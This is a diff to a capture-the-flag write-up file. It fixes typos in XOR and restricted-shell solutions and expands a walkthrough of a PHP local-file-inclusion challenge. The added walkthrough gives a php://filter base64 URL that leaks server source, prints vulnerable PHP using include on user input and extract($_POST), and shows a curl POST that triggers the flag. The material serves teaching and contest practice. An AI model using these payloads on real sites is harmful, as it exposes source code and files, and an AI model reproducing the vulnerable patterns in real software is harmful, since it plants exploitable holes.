@@ -559,7 +559,7 @@ but if we look at a regular PNG file or Zip file we get the following bytes freq
 
 ![](assets//images/docxor_4.png)
 
-we can notice that regulary the \x00 byte is the most frequent, so if the key is xor with the data all of the \x00 bytes will be mapped to the bytes of the key.
+we can notice that regularly the \x00 byte is the most frequent, so if the key is xorred with the data all of the \x00 bytes will be mapped to the bytes of the key.
 
 so we can infer that key is `\x5a\x41\x99\xbb`, plugging the file into cyberchef in xorring the data with the key gives us the following zip file:
 
@@ -1037,7 +1037,7 @@ Connect here:\
 
 ![](assets//images//alkatraz.png)
 
-I eventually got to output the file content to stdout using printf as it is not restricted and using the following command `printf '%s' "$(<flag.txt)"` and we get the flag:
+I eventually got to output the file content to stdout using printf as it is not restricted and using the following command `printf '%s' "$(<flag.txt)"` we get the flag:
 
 ![](assets//images//alkatraz_2.png)
 
@@ -1216,4 +1216,136 @@ http://jh2i.com:50002
 
 **flag**
 
-**Solution:** We have LFI, use PHP wrapper filter to base64 the file phphonebook.php, we can see a check for variable emergency, using proxy such as burpsuite to catch http requests and add the body varaiable emergency returns the flag.
+**Solution:** With the challenge we are given a website with the following index page:
+
+![](assets//images//phphonebook_1.png)
+
+so the site tells us that the php source for the page accepts parameters...oooh we might have LFI (local file inclusion), php allows the inclusion of files from the server as parameters in order to extend the functionality of the code or to use code from other files, but if the code is not sanitising the input (filtering out sensitive files) an attacker can include any arbitrary file on the web server as the input or atleast read the php code in the current directory, this code stays in the setver-side and should never be revealed to the client-side as it may contain sensitive data (and there is no use to it in client-side), but if we want to read php files we'll need to encode or encrypt the data as the LFI vulnrable php code will read the file as code and execute it, we can do such things using the php://filter wrapper, we can use this wrapper in the following way to leak the php code for index page index.php:
+
+`http://jh2i.com:50002/index.php?file=php://filter/convert.base64-encode/resource=index.php`
+
+by going to this url we get the file base64 encoded:
+
+![](assets//images//phphonebook_2.png)
+
+```
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5QaHBob25lYm9vazwvdGl0bGU+CiAgICA8bGluayBocmVmPSJtYWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8L2hlYWQ+CiAgPGJvZHk+Cgk8P3BocAoJCSRmaWxlPSRfR0VUWydmaWxlJ107CgkJaWYoIWlzc2V0KCRmaWxlKSkKCQl7CgkJCWVjaG8gIlNvcnJ5ISBZb3UgYXJlIGluIC9pbmRleC5waHAvP2ZpbGU9IjsKCQl9IGVsc2UKCQl7CgkJCWluY2x1ZGUoc3RyX3JlcGxhY2UoJy5waHAnLCcnLCRfR0VUWydmaWxlJ10pLiIucGhwIik7CgkJCWRpZSgpOwoJCX0KCT8+CgkgIAk8cD5UaGUgcGhvbmVib29rIGlzIGxvY2F0ZWQgYXQgPGNvZGU+cGhwaG9uZWJvb2sucGhwPC9jb2RlPjwvcD4KCjxkaXYgc3R5bGU9InBvc2l0aW9uOmZpeGVkOyBib3R0b206MSU7IGxlZnQ6MSU7Ij4KPGJyPjxicj48YnI+PGJyPgo8Yj4gTk9UIENIQUxMRU5HRSBSRUxBVEVEOjwvYj48YnI+VEhBTksgWU9VIHRvIElOVElHUklUSSBmb3Igc3VwcG9ydGluZyBOYWhhbUNvbiBhbmQgTmFoYW1Db24gQ1RGIQo8cD4KPGltZyB3aWR0aD02MDBweCBzcmM9Imh0dHBzOi8vZDI0d3VxNm85NTFpMmcuY2xvdWRmcm9udC5uZXQvaW1nL2V2ZW50cy9pZC80NTcvNDU3NzQ4MTIxL2Fzc2V0cy9mN2RhMGQ3MThlYjc3YzgzZjVjYjYyMjFhMDZhMmY0NS5pbnRpLnBuZyI+CjwvcD4KPC9kaXY+CgogIDwvYm9keT4KIDwvaHRtbD4=
+```
+
+and decoding from base64 gives us the code:
+```php
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Phphonebook</title>
+    <link href="main.css" rel="stylesheet">
+  </head>
+  <body>
+	<?php
+		$file=$_GET['file'];
+		if(!isset($file))
+		{
+			echo "Sorry! You are in /index.php/?file=";
+		} else
+		{
+			include(str_replace('.php','',$_GET['file']).".php");
+			die();
+		}
+	?>
+	  	<p>The phonebook is located at <code>phphonebook.php</code></p>
+
+<div style="position:fixed; bottom:1%; left:1%;">
+<br><br><br><br>
+<b> NOT CHALLENGE RELATED:</b><br>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!
+<p>
+<img width=600px src="https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png">
+</p>
+</div>
+
+  </body>
+ </html>
+```
+
+By the way we can now tell by this line `include(str_replace('.php','',$_GET['file']).".php");` that we only link php files as the code removes the php extension from the file if there is one and then appends a php extension to it, I think that there are ways to go around this but it is not important for this challenge, doing the same for phphonebook.php gives us this code:
+
+```php
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Phphonebook</title>
+    <link href="main.css" rel="stylesheet">
+  </head>
+
+  <body class="bg">
+    <h1 id="header"> Welcome to the Phphonebook </h1>
+
+    <div id="im_container">
+
+      <img src="book.jpg" width="50%" height="30%"/>
+
+      <p class="desc">
+      This phphonebook was made to look up all sorts of numbers! Have fun...
+      </p>
+
+    </div>
+<br>
+<br>
+    <div>
+      <form method="POST" action="#">
+        <label id="form_label">Enter number: </label>
+        <input type="text" name="number">
+        <input type="submit" value="Submit">
+      </form>
+    </div>
+
+    <div id="php_container">
+    <?php
+      extract($_POST);
+
+    	if (isset($emergency)){
+    		echo(file_get_contents("/flag.txt"));
+    	}
+    ?>
+  </div>
+  </br>
+  </br>
+  </br>
+
+
+<div style="position:fixed; bottom:1%; left:1%;">
+<br><br><br><br>
+<b> NOT CHALLENGE RELATED:</b><br>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!
+<p>
+<img width=600px src="https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png">
+</p>
+</div>
+
+  </body>
+</html>
+```
+
+we can see that by the end of this code there is a php segmant where extract is used on $_POST and then there is a check if $emergency is set, if so the code echoes the content of a file called flag.txt, this is really intesting, I'll explain the gist of it mainly because i'm not so strong at PHP, the $_POST is an array of variables passed to the script when an HTTP POST request is sent to the file (we commonly use 2 type of HTTP request, POST and GET, where GET asks from the server to return something for example the source for a page, and POST also sends variables to the server in the request body), the extract method extracts the variables from the array where the variable name is set to the name passed in the HTTP request and the value is the corresponding value, isset just checks if there is a variable with this name, by all this we can infer that we need to send a POST request to the server with a variable named emergency which has some arbitrary value in order to get the server to print the flag, we can do so using curl or using a proxy like burp suite like I will show first, we need to set burp suite as our proxy and send a post request to the server, we can do such that using the submit button in the phphonebook page:
+
+![](assets//images//phphonebook_3.png)
+
+burp suite catches the request and allows us to edit it:
+
+![](assets//images//phphonebook_4.png)
+
+we now only need to add an emergecy variable and we get the flag:
+
+![](assets//images//phphonebook_5.png)
+
+![](assets//images//phphonebook_6.png)
+
+with curl we can simply use the following command `curl -X POST --data "emergency=1" http://jh2i.com:50002/phphonebook.php` and by using that and grepping for the flag format we can easily get the flag:
+
+![](assets//images//phphonebook_7.png)
+
+
+**Resources:**
+* File Inclusion Vulnrabilities: https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/
+* HTTP request methods: https://www.w3schools.com/tags/ref_httpmethods.asp
+* Payload all the things - File Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
